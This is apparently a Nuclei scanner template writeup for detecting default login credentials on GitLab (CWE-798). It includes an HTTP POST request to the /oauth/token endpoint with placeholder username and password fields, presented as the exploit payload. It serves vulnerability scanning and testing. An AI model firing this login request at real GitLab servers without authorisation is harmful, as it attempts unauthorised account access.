# Nuclei Template: Gitlab Default Login
**Template ID:** gitlab-weak-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`gitlab-weak-login.yaml`)

## Vulnerability Information & PoC

## Description
Gitlab default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /oauth/token HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Referer: {{BaseURL}}
content-type: application/json

{"grant_type":"password","username":"{{username}}","password":"{{password}}"}
```

## References
- https://twitter.com/0xmahmoudJo0/status/1467394090685943809
- https://git-scm.com/book/en/v2/Git-on-the-Server-GitLab
